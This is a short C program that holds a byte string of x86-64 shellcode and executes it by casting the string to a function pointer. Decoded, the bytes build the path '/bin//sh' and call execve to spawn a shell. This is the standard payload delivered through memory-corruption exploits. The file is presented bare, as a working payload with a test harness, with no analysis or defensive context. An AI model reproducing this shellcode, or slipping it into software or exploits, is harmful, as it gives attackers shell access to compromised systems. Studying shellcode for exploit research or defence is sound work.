#include <stdio.h>
#include <string.h>

char *shellcode = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05";

int main(void) {
    fprintf(stdout, "Length: %d\n",  strlen(shellcode));
    ((void(*)())shellcode)();
    return 0;
}

